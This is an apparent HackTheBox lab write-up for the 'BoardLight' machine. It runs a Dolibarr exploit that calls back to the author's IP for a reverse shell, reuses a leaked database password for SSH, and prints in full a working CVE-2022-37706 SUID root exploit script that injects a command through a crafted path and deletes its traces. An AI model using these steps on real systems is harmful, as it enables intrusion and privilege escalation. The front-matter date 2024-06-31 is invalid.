---
title: BoardLight
tags:
  - Linux
  - CRM
  - Enumeration
  - SUID
  - HackTheBox
  - Easy
date: 2024-06-31T00:00:00Z
---
![](Pasted%20image%2020240831201755.png)
## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

After that, I performed an Nmap scan:

```shell
nmap -sC -T4 -p- board.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

So I took a look at the webpage:

![](Pasted%20image%2020240831202645.png)

After some inspection, I decided to perform a scan with [dirsearch 📁](/notes/tools/dirsearch.md), but nothing was found, so I performed a [Ffuf 🐳](/notes/tools/Ffuf.md) scan to scan for subdomains:

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://board.htb:80/ -H 'Host: FUZZ.board.htb' -fs 15949

[redacted]
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 71ms]
```

So we add it to the hosts file.

Now a strange login is found:

![](Pasted%20image%2020240831204415.png)

## Weaponization

As inspecting the code anything was found, I decided to take a look at [CVE-2023-30253](https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253)

## Exploitation

Run the script like:

```shell
python3 exploit.py http://crm.board.htb admin admin 10.10.14.60 666
```

> We've got a shell :D

![](Pasted%20image%2020240831205055.png)

Stabilise it:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

Unfortunately, we've got no permissions to read user flag, so let's try to find something interesting inside the machine. After quite time looking for, I managed to find mysql user credentials inside `/var/www/html/crm.board.htb/htdocs/conf/conf.php` file:

![](Pasted%20image%2020240831211222.png)

So I entered the database to extract SSH creds:

```shell
mysql -u dolibarrowner -p

Enter password: serverfun2$2023!!
SHOW DATABASES;
exit
Database
dolibarr
information_schema
performance_schema

mysql -u dolibarrowner -p
use dolibarr;
SHOW TABLES;
Tables_in_dolibarr
llx_accounting_account
llx_accounting_bookkeeping
llx_accounting_bookkeeping_tmp
llx_accounting_fiscalyear
llx_accounting_groups_account
llx_accounting_journal
llx_accounting_system
[redacted]
```

Nothing interesting was found following these steps, so I tried to combine the user `larissa` with the password of mysql `serverfun2$2023!!`. It worked!

![](Pasted%20image%2020240831212132.png)

> We obtained the user flag!

## Privilege Escalation

Once here, we upload linpeas to the machine and search for PE. In this case, linpeas outputs this SUID binary PE:

![](Pasted%20image%2020240831213016.png)

We can check its version with:

```shell
dpkg -l | grep enlightenment
hi  enlightenment      0.23.1-4      amd64        X11 window manager based on EFL
hi  enlightenment-data 0.23.1-4      all          X11 window manager based on EFL - run time data files
```

We can try this exploit: [CVE-2022-37706](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2022-37706/docs/exploit.sh)

```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

echo -e "If it is not found in fstab, big deal :D "
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```

> We are root now and root flag was gained!

![](Pasted%20image%2020240831215735.png)

==Machine pwned!==

